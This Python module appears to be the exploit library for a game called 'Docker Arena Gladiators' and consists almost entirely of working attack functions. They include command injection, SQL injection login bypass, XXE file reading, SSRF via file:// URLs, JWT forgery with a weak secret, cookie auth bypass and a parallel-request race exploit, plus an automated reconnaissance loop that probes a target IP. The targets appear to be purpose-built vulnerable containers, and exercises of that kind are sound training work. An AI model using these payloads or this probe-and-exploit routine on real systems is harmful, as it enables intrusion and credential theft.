"""
Exploit Library for Docker Arena Gladiators
Contains exploit functions for all 14 vulnerability types
"""

import requests
import json
import base64
import pickle
import threading
import time
try:
    import jwt
except ImportError:
    jwt = None

def get_base_url(ip):
    if ':' not in ip:
        return f"http://{ip}:8000"
    return f"http://{ip}"

# ============================================================================
# EXPLOIT FUNCTIONS
# ============================================================================

def exploit_rce(ip):
    """Remote Code Execution via command injection"""
    url = get_base_url(ip)
    try:
        payload = "127.0.0.1; cat /gladiator/password_hint.txt"
        res = requests.get(f"{url}/health", params={'check': payload}, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip().split()[0]
            return password
    except Exception as e:
        pass
    return None

def exploit_lfi(ip):
    """Local File Inclusion via directory traversal"""
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/file", 
                         params={'path': '/gladiator/password_hint.txt'}, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip()
            return password
    except Exception as e:
        pass
    return None

def exploit_sqli(ip):
    """SQL Injection in login endpoint"""
    url = get_base_url(ip)
    try:
        payload = {
            'username': "admin' OR '1'='1'--",
            'password': 'anything'
        }
        res = requests.post(f"{url}/api/login", data=payload, timeout=2)
        if res.status_code == 200:
            data = res.json()
            if data.get('success') and 'password' in data:
                return data['password']
    except Exception as e:
        pass
    return None

def exploit_ssrf(ip):
    """Server-Side Request Forgery"""
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/fetch", 
                         params={'url': 'file:///gladiator/password_hint.txt'}, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip()
            return password
    except Exception as e:
        pass
    return None

def exploit_xxe(ip):
    """XML External Entity injection"""
    url = get_base_url(ip)
    try:
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///gladiator/password_hint.txt">]>
<config><setting>&xxe;</setting></config>'''
        
        res = requests.post(f"{url}/api/config", data=xxe_payload, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip()
            return password
    except Exception as e:
        pass
    return None

def exploit_deserialization(ip):
    """Insecure Deserialization"""
    url = get_base_url(ip)
    try:
        # Create a malicious object with __exploit__ attribute
        class Exploit:
            __exploit__ = True
        
        obj = Exploit()
        pickled = base64.b64encode(pickle.dumps(obj)).decode()
        
        res = requests.post(f"{url}/api/session", data=pickled, timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except Exception as e:
        pass
    return None

def exploit_idor(ip):
    """Insecure Direct Object Reference"""
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/user/admin", timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except Exception as e:
        pass
    return None

def exploit_auth_bypass(ip):
    """Authentication Bypass via cookie"""
    url = get_base_url(ip)
    try:
        cookies = {'admin': 'true'}
        res = requests.get(f"{url}/api/admin", cookies=cookies, timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except Exception as e:
        pass
    return None

def exploit_jwt(ip):
    """JWT with weak secret"""
    if not jwt: return None
    url = get_base_url(ip)
    try:
        # Forge admin token with weak secret
        token = jwt.encode({'user': 'admin', 'admin': True}, 'secret', algorithm='HS256')
        
        res = requests.post(f"{url}/api/auth", 
                          json={'token': token}, 
                          timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except Exception as e:
        pass
    return None

def exploit_race_condition(ip):
    """Race condition in rate limiting"""
    url = get_base_url(ip)
    try:
        # Send parallel requests to trigger race condition
        results = []
        
        def send_request():
            try:
                res = requests.post(f"{url}/api/attempt", timeout=2)
                if res.status_code == 500:
                    data = res.json()
                    if 'debug_info' in data and 'password' in data['debug_info']:
                        results.append(data['debug_info']['password'])
            except:
                pass
        
        threads = []
        for _ in range(15):  # Send 15 parallel requests
            t = threading.Thread(target=send_request)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=3)
        
        if results:
            return results[0]
    except Exception as e:
        pass
    return None

def exploit_cors(ip):
    """CORS Misconfiguration"""
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/cors-test", timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'password' in data:
                return data['password']
    except Exception as e:
        pass
    return None

def exploit_buffer_overflow(ip):
    """Simulated Buffer Overflow"""
    url = get_base_url(ip)
    try:
        # Send > 256 chars to trigger "crash"
        payload = "A" * 300
        res = requests.post(f"{url}/api/buffer", data=payload, timeout=2)
        if res.status_code == 500 and "Memory contents:" in res.text:
            password = res.text.split("Memory contents:")[1].strip()
            return password
    except Exception as e:
        pass
    return None

def exploit_redirect(ip):
    """Open Redirect"""
    url = get_base_url(ip)
    try:
        # Redirect doesn't directly give a password in our server logic,
        # but we use it to 'bounce' to the credential file.
        res = requests.get(f"{url}/redirect", params={'url': f'{url}/password_hint.txt'}, timeout=2)
        if res.status_code == 200 and "Root Password set to:" in res.text:
            password = res.text.split("Root Password set to:")[1].strip()
            return password
    except Exception as e:
        pass
    return None

def exploit_env_leak(ip):
    """Environment Variable Leak"""
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/env", timeout=2)
        if res.status_code == 200:
            data = res.json()
            if 'ROOT_PASSWORD' in data:
                return data['ROOT_PASSWORD']
    except Exception as e:
        pass
    return None

# ============================================================================
# RECONNAISSANCE PROBES
# ============================================================================

def probe_rce(ip):
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/health", timeout=1)
        return res.status_code != 404
    except: return False

def probe_lfi(ip):
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/file?path=/etc/hostname", timeout=1)
        return res.status_code != 404
    except: return False

def probe_sqli(ip):
    url = get_base_url(ip)
    try:
        res = requests.post(f"{url}/api/login", data={'username': 'test'}, timeout=1)
        return res.status_code != 404
    except: return False

def probe_ssrf(ip):
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/fetch?url=http://127.0.0.1", timeout=1)
        return res.status_code != 404
    except: return False

def probe_xxe(ip):
    url = get_base_url(ip)
    try:
        res = requests.post(f"{url}/api/config", data='<test/>', timeout=1)
        return res.status_code != 404
    except: return False

def probe_deserialization(ip):
    url = get_base_url(ip)
    try:
        res = requests.post(f"{url}/api/session", data='test', timeout=1)
        return res.status_code != 404
    except: return False

def probe_idor(ip):
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/user/1", timeout=1)
        return res.status_code != 404
    except: return False

def probe_auth_bypass(ip):
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/admin", timeout=1)
        return res.status_code != 404
    except: return False

def probe_jwt(ip):
    url = get_base_url(ip)
    try:
        res = requests.post(f"{url}/api/auth", json={}, timeout=1)
        return res.status_code != 404
    except: return False

def probe_race_condition(ip):
    url = get_base_url(ip)
    try:
        res = requests.post(f"{url}/api/attempt", timeout=1)
        return res.status_code != 404
    except: return False

def probe_cors(ip):
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/cors-test", timeout=1)
        return res.status_code != 404
    except: return False

def probe_buffer_overflow(ip):
    url = get_base_url(ip)
    try:
        res = requests.post(f"{url}/api/buffer", data='test', timeout=1)
        return res.status_code != 404
    except: return False

def probe_redirect(ip):
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/redirect", timeout=1)
        return res.status_code != 404
    except: return False

def probe_env_leak(ip):
    url = get_base_url(ip)
    try:
        res = requests.get(f"{url}/api/env", timeout=1)
        return res.status_code != 404
    except: return False

# ============================================================================
# MAPPINGS
# ============================================================================

PROBE_MAP = {
    'RCE': probe_rce,
    'LFI': probe_lfi,
    'SQLi': probe_sqli,
    'SSRF': probe_ssrf,
    'XXE': probe_xxe,
    'DESERIAL': probe_deserialization,
    'IDOR': probe_idor,
    'AUTH_BYPASS': probe_auth_bypass,
    'JWT': probe_jwt,
    'RACE': probe_race_condition,
    'CORS': probe_cors,
    'BUFFER': probe_buffer_overflow,
    'REDIRECT': probe_redirect,
    'ENV_LEAK': probe_env_leak
}

EXPLOIT_MAP = {
    'RCE': exploit_rce,
    'LFI': exploit_lfi,
    'SQLi': exploit_sqli,
    'SSRF': exploit_ssrf,
    'XXE': exploit_xxe,
    'DESERIAL': exploit_deserialization,
    'IDOR': exploit_idor,
    'AUTH_BYPASS': exploit_auth_bypass,
    'JWT': exploit_jwt,
    'RACE': exploit_race_condition,
    'CORS': exploit_cors,
    'BUFFER': exploit_buffer_overflow,
    'REDIRECT': exploit_redirect,
    'ENV_LEAK': exploit_env_leak
}

def reconnaissance(ip):
    """Probe target to discover which vulnerabilities exist"""
    discovered = []
    for name, probe_func in PROBE_MAP.items():
        try:
            if probe_func(ip):
                discovered.append(name)
        except:
            pass
    return discovered
